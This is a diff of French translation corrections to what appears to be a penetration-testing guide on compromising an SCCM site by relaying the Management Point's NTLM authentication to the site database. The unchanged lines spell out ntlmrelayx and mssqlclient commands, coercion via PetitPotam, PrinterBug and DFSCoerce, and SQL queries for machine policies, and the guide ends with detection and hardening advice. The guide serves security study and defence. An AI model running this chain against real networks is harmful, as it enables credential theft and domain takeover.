@@ -9,7 +9,7 @@ Chaîne de haut niveau :
 1. Découvrir MP & base de données du site ↦ point de terminaison HTTP non authentifié `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Démarrer `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
 3. Forcer MP en utilisant **PetitPotam**, PrinterBug, DFSCoerce, etc.
-4. À travers le proxy SOCKS, se connecter avec `mssqlclient.py -windows-auth` en tant que compte relayed **<DOMAIN>\\<MP-host>$**.
+4. À travers le proxy SOCKS, se connecter avec `mssqlclient.py -windows-auth` en tant que compte relayé **<DOMAIN>\\<MP-host>$**.
 5. Exécuter :
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
@@ -58,14 +58,14 @@ proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
 Passez à la base de données **CM_<SiteCode>** (utilisez le code de site à 3 chiffres, par exemple `CM_001`).
 
-### 3.1  Trouver les GUIDs d'ordinateur inconnus (optionnel)
+### 3.1  Trouver les GUID d'ordinateur inconnu (optionnel)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2  Liste des politiques assignées
+### 3.2  Lister les politiques assignées
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
@@ -128,7 +128,7 @@ AND  pe.permission_name='EXECUTE';
 
 ## 6. Détection & Renforcement
 1. **Surveiller les connexions MP** – tout compte d'ordinateur MP se connectant depuis une IP qui n'est pas son hôte ≈ relais.
-2. Activer **Extended Protection for Authentication (EPA)** sur la base de données du site (`PREVENT-14`).
+2. Activer **Protection Étendue pour l'Authentification (EPA)** sur la base de données du site (`PREVENT-14`).
 3. Désactiver NTLM inutilisé, appliquer la signature SMB, restreindre RPC (
 mêmes atténuations utilisées contre `PetitPotam`/`PrinterBug`).
 4. Renforcer la communication MP ↔ DB avec IPSec / mutual-TLS.
